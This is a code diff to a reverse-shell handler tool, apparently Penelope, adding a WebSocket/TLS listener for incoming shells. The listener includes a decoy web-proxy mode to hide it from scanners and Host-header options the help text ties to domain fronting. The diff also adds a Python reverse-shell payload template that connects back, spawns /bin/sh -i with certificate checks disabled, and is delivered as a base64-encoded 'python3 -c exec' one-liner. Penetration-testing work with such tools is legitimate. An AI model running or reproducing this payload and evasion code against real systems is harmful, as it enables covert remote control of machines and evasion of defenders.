@@ -32,6 +32,7 @@ import shlex
 import queue
 import codecs
 import struct
+import hashlib
 import shutil
 import atexit
 import socket
@@ -2095,6 +2096,24 @@ class Core:
 					logger.debug(f"New thread: {thread_name}")
 					threading.Thread(target=Session, args=(_socket, *endpoint, readable), name=thread_name).start()
 
+				# WebSocket listeners: accept the TCP conn here, hand off to a
+				# per-connection thread that runs the TLS+WS handshake before
+				# constructing the Session
+				elif readable.__class__ is WSListener:
+					try:
+						_socket, endpoint = readable.socket.accept()
+					except BlockingIOError:
+						continue
+					except OSError:
+						continue
+					if sum(1 for s in tuple(self.sessions.values()) if s.ip == endpoint[0]) >= options.max_sessions:
+						_socket.close()
+						logger.debug(f"Rejected {endpoint}: max sessions per host ({options.max_sessions}) reached")
+						continue
+					thread_name = f"NewWSCon{endpoint}"
+					logger.debug(f"New thread: {thread_name}")
+					threading.Thread(target=readable._handoff, args=(_socket, endpoint), name=thread_name).start()
+
 				# STDIN
 				elif readable is sys.stdin:
 					if self.attached_session:
@@ -2181,6 +2200,13 @@ class Core:
 						readable.shell_response_buf.seek(0)
 						readable.shell_response_buf.truncate(0)
 
+					# WS control frames (PONG for a received PING, CLOSE reply) were
+					# queued during recv(). Force the session into wlist so we flush
+					# them even if the shell hasn't produced any output to send.
+					if isinstance(readable.socket, WebSocketConn) and readable.socket.has_pending_ctrl():
+						if readable not in self.wlist:
+							self.wlist.append(readable)
+
 			for writable in writables:
 				with writable.wlock:
 					try:
@@ -2199,7 +2225,13 @@ class Core:
 					writable.outbuf.truncate()
 					writable.outbuf.write(remaining)
 					if not remaining:
-						self.wlist.remove(writable)
+						# keep WS sessions in wlist if a control-frame reply is still
+						# owed to the peer (PONG / CLOSE ack) — has_pending_ctrl()
+						# won't produce shell output on its own to trigger a re-add
+						if isinstance(writable.socket, WebSocketConn) and writable.socket.has_pending_ctrl():
+							pass
+						else:
+							self.wlist.remove(writable)
 
 	def stop(self):
 		options.maintain = 0
@@ -2481,6 +2513,576 @@ class Channel:
 	def close(self):
 		os.close(self._read)
 		os.close(self._write)
+
+# ---- WebSocket transport (RFC 6455) ------------------------------------------
+# WS_OP_* opcodes and WS_MAX_FRAME_PAYLOAD cap are used by WebSocketConn
+# below and by the WSListener that will consume it in a follow-up commit.
+WS_OP_CONT   = 0x0
+WS_OP_TEXT   = 0x1
+WS_OP_BINARY = 0x2
+WS_OP_CLOSE  = 0x8
+WS_OP_PING   = 0x9
+WS_OP_PONG   = 0xA
+
+# Cap inbound frame payloads. 64 KiB pre-Session mirrors chisel's default
+# CHISEL_WS_READ_LIMIT and is well above SSH's ~35 KiB max packet, so it is
+# large enough for our Messenger TLV frames yet small enough to prevent a
+# pre-auth peer from exhausting memory with an oversized length header.
+WS_MAX_FRAME_PAYLOAD = 64 * 1024
+
+class WebSocketConn:
+	"""
+	Non-blocking adapter around a raw socket that speaks RFC 6455.
+
+	Sits between a TCP socket (or SSL-wrapped socket) and Session so that
+	Session sees an ordinary socket-like object. The Messenger TLV runs
+	inside the WS binary frames just like it runs over raw TCP.
+
+	Contract:
+	  - recv(n) returns decoded application bytes. Ignores `n` as an upper
+	    bound and drains all currently-decoded payload in one call: fileno()
+	    reflects only TCP-readability, so buffering the leftover would
+	    strand it until the next TCP event fires, which Core cannot know to
+	    break out of. Payload sizes are capped by WS_MAX_FRAME_PAYLOAD.
+	  - recv(n) raises BlockingIOError when the frame is still incomplete,
+	    and returns b"" iff the peer sent CLOSE (or TCP closed abnormally).
+	  - send(data) prepends any queued control-frame bytes (PONG replies,
+	    CLOSE reply) and TCP-sends. Returns the number of caller bytes
+	    accepted so Session.outbuf drains correctly. BlockingIOError iff
+	    TCP would block while control bytes are still pending.
+	  - frame(data, opcode=BINARY) builds one unmasked FIN=1 frame; server
+	    -to-client MUST NOT mask (RFC 6455 5.1). Session.send() wraps its
+	    outbound bytes with this before writing to outbuf.
+	  - has_pending_ctrl() lets Core add the Session to wlist even when
+	    outbuf is empty so PONG/CLOSE replies do not stall waiting for the
+	    next byte of shell output.
+	"""
+
+	def __init__(self, sock):
+		self._sock = sock
+		self._rbuf = bytearray()     # partial-frame TCP bytes waiting to parse
+		self._payload = bytearray()  # decoded app bytes waiting for recv()
+		self._ctrl_out = bytearray() # framed PONG/CLOSE bytes queued to send
+		self._peer_closed = False
+		self._cont_opcode = None     # in-flight fragmented message opcode
+
+	# socket look-alikes: delegated to the underlying socket
+	def fileno(self):        return self._sock.fileno()
+	def setsockopt(self, *a, **kw): return self._sock.setsockopt(*a, **kw)
+	def setblocking(self, f): return self._sock.setblocking(f)
+	def getpeername(self):    return self._sock.getpeername()
+	def getsockname(self):    return self._sock.getsockname()
+	def close(self):
+		try:
+			self._sock.close()
+		except OSError:
+			pass
+
+	@staticmethod
+	def frame(data, opcode=WS_OP_BINARY):
+		b1 = 0x80 | (opcode & 0x0F)
+		n = len(data)
+		if n < 126:
+			return struct.pack("!BB", b1, n) + data
+		if n < (1 << 16):
+			return struct.pack("!BBH", b1, 126, n) + data
+		return struct.pack("!BBQ", b1, 127, n) + data
+
+	def has_pending_ctrl(self):
+		return bool(self._ctrl_out)
+
+	def _queue_ctrl(self, opcode, payload=b""):
+		self._ctrl_out.extend(self.frame(payload, opcode))
+
+	def _try_parse(self):
+		buf = self._rbuf
+		if len(buf) < 2:
+			return None
+		b1, b2 = buf[0], buf[1]
+		fin  = (b1 & 0x80) != 0
+		rsv  = (b1 & 0x70)
+		op   = b1 & 0x0F
+		mask = (b2 & 0x80) != 0
+		ln   = b2 & 0x7F
+		if rsv:
+			raise OSError("ws: reserved bits set")
+		if not mask:
+			raise OSError("ws: client frame not masked")
+		off = 2
+		if ln == 126:
+			if len(buf) < off + 2:
+				return None
+			ln, = struct.unpack_from("!H", buf, off); off += 2
+		elif ln == 127:
+			if len(buf) < off + 8:
+				return None
+			ln, = struct.unpack_from("!Q", buf, off); off += 8
+		if ln > WS_MAX_FRAME_PAYLOAD:
+			raise OSError("ws: frame too large (%d > %d)" % (ln, WS_MAX_FRAME_PAYLOAD))
+		if len(buf) < off + 4 + ln:
+			return None
+		mkey = bytes(buf[off:off + 4]); off += 4
+		raw = bytes(buf[off:off + ln])
+		payload = bytes(b ^ mkey[i & 3] for i, b in enumerate(raw)) if ln else b""
+		del buf[:off + ln]
+		if op & 0x8:  # control frame
+			if not fin:
+				raise OSError("ws: fragmented control frame")
+			if ln > 125:
+				raise OSError("ws: oversized control frame")
+		return fin, op, payload
+
+	def recv(self, n):
+		if self._peer_closed and not self._payload:
+			return b""
+		if not self._payload:
+			data = self._sock.recv(options.network_buffer_size)
+			if not data:
+				return b""
+			self._rbuf.extend(data)
+			while True:
+				parsed = self._try_parse()
+				if parsed is None:
+					break
+				fin, op, payload = parsed
+				if op == WS_OP_PING:
+					self._queue_ctrl(WS_OP_PONG, payload)
+				elif op == WS_OP_PONG:
+					pass
+				elif op == WS_OP_CLOSE:
+					self._queue_ctrl(WS_OP_CLOSE, payload[:2] if len(payload) >= 2 else b"")
+					self._peer_closed = True
+					break
+				elif op == WS_OP_CONT:
+					if self._cont_opcode is None:
+						raise OSError("ws: continuation without start")
+					self._payload.extend(payload)
+					if fin:
+						self._cont_opcode = None
+				elif op in (WS_OP_TEXT, WS_OP_BINARY):
+					if self._cont_opcode is not None:
+						raise OSError("ws: new message while continuation in flight")
+					self._payload.extend(payload)
+					if not fin:
+						self._cont_opcode = op
+				else:
+					raise OSError("ws: bad opcode 0x%x" % op)
+		if self._payload:
+			chunk = bytes(self._payload)
+			self._payload.clear()
+			return chunk
+		if self._peer_closed:
+			return b""
+		raise BlockingIOError
+
+	def send(self, data):
+		out = bytes(self._ctrl_out) + data
+		sent = self._sock.send(out)
+		ctrl_len = len(self._ctrl_out)
+		if sent <= ctrl_len:
+			del self._ctrl_out[:sent]
+			raise BlockingIOError
+		self._ctrl_out.clear()
+		return sent - ctrl_len
+
+WS_GUID = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
+
+def _ws_sec_accept(client_key):
+	# RFC 6455 4.2.2: base64(sha1(key + magic guid))
+	digest = hashlib.sha1(client_key.encode("ascii") + WS_GUID).digest()
+	return base64.b64encode(digest).decode("ascii")
+
+def _ws_read_request(sock, max_bytes=8192):
+	# Read one HTTP/1.1 request head from a blocking socket. Bounded to
+	# max_bytes so a slowloris cannot exhaust memory before the upgrade.
+	# Returns (method, path, headers-dict, leftover-bytes) or raises OSError.
+	buf = bytearray()
+	while b"\r\n\r\n" not in buf:
+		chunk = sock.recv(1024)
+		if not chunk:
+			raise OSError("closed during handshake")
+		buf.extend(chunk)
+		if len(buf) > max_bytes:
+			raise OSError("handshake headers too large")
+	end = buf.find(b"\r\n\r\n")
+	head = bytes(buf[:end]).decode("iso-8859-1", errors="replace")
+	lines = head.split("\r\n")
+	parts = lines[0].split(" ", 2)
+	if len(parts) < 3:
+		raise OSError("bad request line")
+	method, path, _ = parts
+	headers = {}
+	for line in lines[1:]:
+		if ":" not in line:
+			continue
+		k, v = line.split(":", 1)
+		headers[k.strip().lower()] = v.strip()
+	leftover = bytes(buf[end + 4:])
+	return method, path, headers, leftover
+
+class WSListener:
+	"""
+	HTTP+WebSocket listener. Accepts an upgrade at `path`, does the RFC
+	6455 handshake, and returns a WebSocketConn ready for Session use.
+
+	Wiring into Core (and the CLI --ws flag) lands in follow-up commits.
+	This commit only introduces the class so it can be unit-tested and
+	referenced by the wiring commit.
+	"""
+
+	def __init__(self, host, port, path="/", host_pattern=None, tls_ctx=None, backend_url=None):
+		self.host = host
+		self.port = port
+		self.path = path
+		self.host_pattern = host_pattern  # None or a compiled re.Pattern
+		self.tls_ctx = tls_ctx            # None or an ssl.SSLContext
+		self.backend_url = backend_url    # None or "https://decoy.example.com"; forwarded on non-WS requests
+		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		self.socket.bind((host, port))
+		self.socket.listen(5)
+		self.socket.setblocking(False)
+		# remember what port the OS picked when port was 0
+		self.host, self.port = self.socket.getsockname()
+
+	def __str__(self):
+		scheme = "wss" if self.tls_ctx else "ws"
+		return f"WSListener({scheme}://{self.host}:{self.port}{self.path})"
+
+	def __bool__(self):
+		return hasattr(self, 'id')
+
+	def fileno(self):
+		return self.socket.fileno()
+
+	def start(self):
+		scheme = "wss" if self.tls_ctx else "ws"
+		specific = ""
+		if self.host == '0.0.0.0':
+			specific = paint('-> ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().ips])
+		logger.info(
+			f"Listening for {scheme.upper()} reverse shells on "
+			f"{paint(self.host).blue}{paint(':').white}{paint(self.port).orange}"
+			f"{paint(self.path).cyan} {specific}"
+		)
+		self.id = core.new_listenerID
+		core.rlist.append(self)
+		core.listeners[self.id] = self
+		if not core.started:
+			core.start()
+		core.control << None
+
+	def stop(self):
+		if threading.current_thread().name != 'Core':
+			core.control << (lambda: core.listeners[self.id].stop())
+			return
+		core.rlist.remove(self)
+		del core.listeners[self.id]
+		try:
+			self.socket.shutdown(socket.SHUT_RDWR)
+		except OSError:
+			pass
+		self.socket.close()
+		logger.warning(f"Stopping {self}")
+
+	def _handoff(self, raw_sock, endpoint):
+		# runs in a per-connection thread: TLS + WS handshake + Session
+		try:
+			conn = self.accept_ws(raw_sock, endpoint)
+		except OSError as e:
+			logger.debug(f"WS handshake failed for {endpoint}: {e}")
+			return
+		Session(conn, endpoint[0], endpoint[1], self)
+
+	def _deny(self, sock, status, body=b""):
+		try:
+			sock.sendall(
+				("HTTP/1.1 " + status + "\r\n"
+				 "Content-Length: " + str(len(body)) + "\r\n"
+				 "Connection: close\r\n\r\n").encode("ascii") + body
+			)
+		except OSError:
+			pass
+
+	def accept_ws(self, raw_sock, peer_addr=None, timeout=10.0):
+		"""
+		Blocking WS handshake on an already-accepted raw socket. Returns a
+		WebSocketConn ready for non-blocking Session use, or raises OSError.
+		On any handshake failure this sends a short HTTP error and closes
+		the socket. TLS is wrapped first if tls_ctx was configured.
+		"""
+		raw_sock.settimeout(timeout)
+		if self.tls_ctx is not None:
+			try:
+				raw_sock = self.tls_ctx.wrap_socket(raw_sock, server_side=True)
+			except (ssl.SSLError, OSError) as e:
+				try:
+					raw_sock.close()
+				except OSError:
+					pass
+				raise OSError("tls handshake failed: %s" % e)
+		try:
+			method, path, headers, leftover = _ws_read_request(raw_sock)
+		except OSError:
+			try:
+				raw_sock.close()
+			except OSError:
+				pass
+			raise
+		# Any request that isn't a well-formed WS upgrade at the expected
+		# path/Host either gets forwarded to the decoy backend (so the
+		# port looks like a normal web server to internet scanners) or
+		# receives a plain HTTP error.
+		def _decoy_or_deny(status, reason):
+			if self.backend_url:
+				try:
+					self._proxy_to_backend(raw_sock, method, path, headers, leftover)
+				except Exception as e:
+					logger.debug("ws-backend proxy failed: %s" % e)
+			else:
+				self._deny(raw_sock, status)
+			try:
+				raw_sock.close()
+			except OSError:
+				pass
+			raise OSError(reason)
+
+		if method != "GET":
+			return _decoy_or_deny("405 Method Not Allowed", "bad method %s" % method)
+		if path != self.path:
+			return _decoy_or_deny("404 Not Found", "path mismatch %s" % path)
+		if self.host_pattern is not None:
+			if not self.host_pattern.match(headers.get("host", "")):
+				return _decoy_or_deny("404 Not Found", "host header rejected")
+		upgrade = headers.get("upgrade", "").lower()
+		conn_hdr = headers.get("connection", "").lower()
+		if upgrade != "websocket" or "upgrade" not in conn_hdr:
+			return _decoy_or_deny("400 Bad Request", "not a ws upgrade")
+		key = headers.get("sec-websocket-key")
+		if not key:
+			self._deny(raw_sock, "400 Bad Request")
+			raw_sock.close()
+			raise OSError("missing sec-websocket-key")
+		if headers.get("sec-websocket-version") != "13":
+			self._deny(raw_sock, "400 Bad Request")
+			raw_sock.close()
+			raise OSError("unsupported ws version")
+		accept = _ws_sec_accept(key)
+		resp = (
+			"HTTP/1.1 101 Switching Protocols\r\n"
+			"Upgrade: websocket\r\n"
+			"Connection: Upgrade\r\n"
+			"Sec-WebSocket-Accept: " + accept + "\r\n"
+			"\r\n"
+		).encode("ascii")
+		try:
+			raw_sock.sendall(resp)
+		except OSError as e:
+			raw_sock.close()
+			raise OSError("failed to send 101: %s" % e)
+		raw_sock.setblocking(False)
+		ws = WebSocketConn(raw_sock)
+		if leftover:
+			# client bytes that piggy-backed on the handshake
+			ws._rbuf.extend(leftover)
+		return ws
+
+	def close(self):
+		try:
+			self.socket.close()
+		except OSError:
+			pass
+
+	def _proxy_to_backend(self, sock, method, path, headers, body):
+		"""
+		One-shot reverse proxy of a non-WS HTTP request to self.backend_url.
+		Buffered (no streaming) — decoy backends are expected to serve small
+		pages. Response body is capped at 10 MiB to prevent memory blow-up
+		if an operator pointed the decoy at something huge.
+		"""
+		MAX_RESP = 10 * 1024 * 1024
+		# forward request body if any
+		cl = 0
+		try:
+			cl = int(headers.get("content-length", "0") or 0)
+		except ValueError:
+			cl = 0
+		body_bytes = bytes(body or b"")
+		if cl > len(body_bytes):
+			need = cl - len(body_bytes)
+			while need > 0:
+				chunk = sock.recv(min(need, 65536))
+				if not chunk:
+					break
+				body_bytes += chunk
+				need -= len(chunk)
+		# hop-by-hop headers per RFC 7230 6.1 plus Host (we set it ourselves)
+		# and framing headers that urllib will regenerate
+		HOP_BY_HOP = {"connection", "keep-alive", "proxy-authenticate",
+		              "proxy-authorization", "te", "trailers",
+		              "transfer-encoding", "upgrade", "host", "content-length",
+		              "sec-websocket-key", "sec-websocket-version",
+		              "sec-websocket-protocol", "sec-websocket-extensions",
+		              "sec-websocket-accept"}
+		req_headers = {}
+		for k, v in headers.items():
+			if k.lower() in HOP_BY_HOP:
+				continue
+			req_headers[k] = v
+		url = self.backend_url.rstrip("/") + path
+		try:
+			parsed = urlsplit(url)
+		except ValueError:
+			sock.sendall(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+			return
+		req_headers["Host"] = parsed.netloc
+		req = Request(url, data=body_bytes if body_bytes else None,
+		              method=method, headers=req_headers)
+		try:
+			resp = urlopen(req, timeout=15)
+			status = resp.status
+			reason = resp.reason or ""
+			resp_headers = resp.headers
+			resp_body = resp.read(MAX_RESP + 1)
+		except HTTPError as e:
+			status = e.code
+			reason = e.reason or ""
+			resp_headers = e.headers
+			resp_body = e.read(MAX_RESP + 1)
+		except (URLError, OSError) as e:
+			logger.debug("ws-backend unreachable: %s" % e)
+			sock.sendall(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+			return
+		if len(resp_body) > MAX_RESP:
+			resp_body = resp_body[:MAX_RESP]
+		# build response
+		reply = bytearray()
+		reply.extend(("HTTP/1.1 %d %s\r\n" % (status, reason)).encode("ascii"))
+		for k, v in resp_headers.items():
+			if k.lower() in HOP_BY_HOP:
+				continue
+			reply.extend(("%s: %s\r\n" % (k, v)).encode("iso-8859-1"))
+		reply.extend(("Content-Length: %d\r\n" % len(resp_body)).encode("ascii"))
+		reply.extend(b"Connection: close\r\n\r\n")
+		reply.extend(resp_body)
+		try:
+			sock.sendall(bytes(reply))
+		except OSError:
+			pass
+
+	def payloads(self, interface_filter=None):
+		pairs = Interfaces().pairs
+		name_of_ip = {ip: name for name, ip in pairs}
+		output = [str(paint(self).white_MAGENTA), ""]
+
+		ips = [self.host]
+		if self.host == '0.0.0.0':
+			ips = [ip for _, ip in pairs]
+
+		scheme = "wss" if self.tls_ctx else "ws"
+		use_tls = bool(self.tls_ctx)
+
+		interface_count = 0
+		for ip in ips:
+			iface_name = name_of_ip.get(ip)
+			if interface_filter and iface_name != interface_filter:
+				continue
+			iface_name = paint(iface_name).GREEN_black
+			interface_count += 1
+			output.extend((
+				f"➤  {iface_name} → {str(paint(scheme + '://' + ip).cyan)}:{str(paint(self.port).orange)}{str(paint(self.path).cyan)}",
+				"",
+				str(paint("Python WebSocket").UNDERLINE),
+			))
+			src = _ws_python_revshell_src(ip, self.port, self.path, ip, use_tls)
+			blob = base64.b64encode(src.encode()).decode()
+			output.append(f"python3 -c \"import base64;exec(base64.b64decode('{blob}'))\"")
+			output.append("")
+
+		output.append("─" * 80)
+		if not interface_count:
+			return ""
+		return "\n".join(output) + "\n"
+
+WS_PYTHON_REVSHELL_TEMPLATE = r"""
+import socket, ssl, base64, os, struct, subprocess, threading
+HOST = {host!r}
+PORT = {port}
+PATH = {path!r}
+HOSTHDR = {hosthdr!r}
+USE_TLS = {use_tls}
+s = socket.create_connection((HOST, PORT))
+if USE_TLS:
+	ctx = ssl.create_default_context()
+	ctx.check_hostname = False
+	ctx.verify_mode = ssl.CERT_NONE
+	s = ctx.wrap_socket(s, server_hostname=HOSTHDR)
+k = base64.b64encode(os.urandom(16)).decode()
+s.sendall(("GET " + PATH + " HTTP/1.1\r\nHost: " + HOSTHDR + "\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: " + k + "\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
+buf = b""
+while b"\r\n\r\n" not in buf:
+	c = s.recv(4096)
+	if not c: raise SystemExit(1)
+	buf += c
+leftover = [buf.split(b"\r\n\r\n", 1)[1]]
+sh = subprocess.Popen(["/bin/sh", "-i"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)
+def rn(n):
+	d = b""
+	while len(d) < n:
+		if leftover[0]:
+			t = leftover[0][:n - len(d)]
+			d += t
+			leftover[0] = leftover[0][len(t):]
+			continue
+		c = s.recv(n - len(d))
+		if not c: raise SystemExit(0)
+		d += c
+	return d
+def rf():
+	h = rn(2)
+	b1, b2 = h[0], h[1]
+	m = b2 & 0x80
+	ln = b2 & 0x7f
+	if ln == 126: ln = struct.unpack("!H", rn(2))[0]
+	elif ln == 127: ln = struct.unpack("!Q", rn(8))[0]
+	mk = rn(4) if m else b""
+	p = rn(ln) if ln else b""
+	if m: p = bytes(b ^ mk[i & 3] for i, b in enumerate(p))
+	return b1 & 0x0f, p
+def sf(data, op=2):
+	b1 = 0x80 | op
+	mk = os.urandom(4)
+	n = len(data)
+	if n < 126: h = struct.pack("!BB", b1, 0x80 | n)
+	elif n < 65536: h = struct.pack("!BBH", b1, 0x80 | 126, n)
+	else: h = struct.pack("!BBQ", b1, 0x80 | 127, n)
+	mp = bytes(b ^ mk[i & 3] for i, b in enumerate(data))
+	s.sendall(h + mk + mp)
+def po():
+	while True:
+		c = sh.stdout.read(4096)
+		if not c: break
+		try: sf(c)
+		except Exception: break
+threading.Thread(target=po, daemon=True).start()
+while True:
+	try:
+		op, p = rf()
+	except SystemExit: break
+	except Exception: break
+	if op == 8: break
+	if p:
+		try:
+			sh.stdin.write(p)
+			sh.stdin.flush()
+		except Exception: break
+""".lstrip()
+
+def _ws_python_revshell_src(host, port, path, hosthdr, use_tls):
+	return WS_PYTHON_REVSHELL_TEMPLATE.format(
+		host=host, port=port, path=path, hosthdr=hosthdr,
+		use_tls=repr(bool(use_tls)),
+	)
 
 class Session:
 
@@ -3103,14 +3705,22 @@ class Session:
 			if not self in core.rlist:
 				return False
 
+			# WS transport: frame outbound bytes as one BINARY frame so the
+			# peer's WS decoder can read them. Raw TCP passes through as-is.
+			# Return the caller's byte count either way so upload/exec/etc.
+			# don't get confused by frame-header overhead.
+			_input_len = len(data)
+			if isinstance(self.socket, WebSocketConn):
+				data = WebSocketConn.frame(data)
+
 			self.outbuf.seek(0, io.SEEK_END)
-			_len = self.outbuf.write(data)
+			self.outbuf.write(data)
 
 			if self not in core.wlist:
 				core.wlist.append(self)
 				if not stdin:
 					core.control << None
-			return _len
+			return _input_len
 
 	def record(self, data, _input=False):
 		self.last_lines << data
@@ -7041,6 +7651,12 @@ class Options:
 		self.mcp_host = ''
 		self.mcp_port = 0
 		self.mcp_token = ''
+		self.ws = False
+		self.ws_path = '/'
+		self.ws_host = ''
+		self.ws_backend = ''
+		self.tls_cert = ''
+		self.tls_key = ''
 		self.no_bins = ''
 
 	def __getattribute__(self, option):
@@ -7172,6 +7788,14 @@ def main():
 	mcp.add_argument("--mcp-port", help="Port to bind (default: saved port, else a random free port persisted to ~/.penelope/mcp.json)", type=int, metavar='')
 	mcp.add_argument("--mcp-token", help="Bearer token (default: saved token, else auto-generated and persisted)", type=str, metavar='')
 
+	ws = parser.add_argument_group("WebSocket listener")
+	ws.add_argument("--ws", help="Accept reverse shells over HTTP(S)+WebSocket instead of raw TCP", action="store_true")
+	ws.add_argument("--ws-path", help="URL path where the upgrade is accepted (default: /)", type=str, metavar='')
+	ws.add_argument("--ws-host", help="Optional Host: header allow-regex (default: accept any, needed for domain fronting)", type=str, metavar='')
+	ws.add_argument("--ws-backend", help="Decoy reverse-proxy URL for non-WS requests (hides the listener behind a plausible website)", type=str, metavar='')
+	ws.add_argument("--tls-cert", help="PEM certificate for TLS termination (enables wss://)", type=str, metavar='')
+	ws.add_argument("--tls-key", help="PEM private key matching --tls-cert", type=str, metavar='')
+
 	fileserver = parser.add_argument_group("File server")
 	fileserver.add_argument("-s", "--serve", help="Run HTTP file server mode", action="store_true")
 	fileserver.add_argument("-prefix", "--url-prefix", help="URL path prefix", type=str, metavar='')
@@ -7286,8 +7910,40 @@ def main():
 
 	# Reverse Listeners
 	else:
+		# Build an ssl.SSLContext once if --tls-cert/--tls-key are set; the
+		# same context is shared across every WSListener the CLI spawns.
+		tls_ctx = None
+		if options.ws and (options.tls_cert or options.tls_key):
+			if not (options.tls_cert and options.tls_key):
+				logger.error("--tls-cert and --tls-key must be provided together")
+				sys.exit(1)
+			try:
+				tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+				tls_ctx.load_cert_chain(certfile=options.tls_cert, keyfile=options.tls_key)
+			except (ssl.SSLError, OSError) as e:
+				logger.error(f"TLS setup failed: {e}")
+				sys.exit(1)
+
+		ws_host_pattern = re.compile(options.ws_host) if options.ws and options.ws_host else None
+
 		for port in options.ports:
-			TCPListener(host=options.interface, port=port, jump=options.jump)
+			if options.ws:
+				host = Interfaces().translate(options.interface or options.default_interface)
+				try:
+					listener = WSListener(
+						host=host,
+						port=int(port or options.default_listener_port),
+						path=options.ws_path or '/',
+						host_pattern=ws_host_pattern,
+						tls_ctx=tls_ctx,
+						backend_url=options.ws_backend or None,
+					)
+				except OSError as e:
+					logger.error(f"Failed to bind WSListener: {e}")
+					continue
+				listener.start()
+			else:
+				TCPListener(host=options.interface, port=port, jump=options.jump)
 			if not core.listeners:
 				sys.exit(1)
 
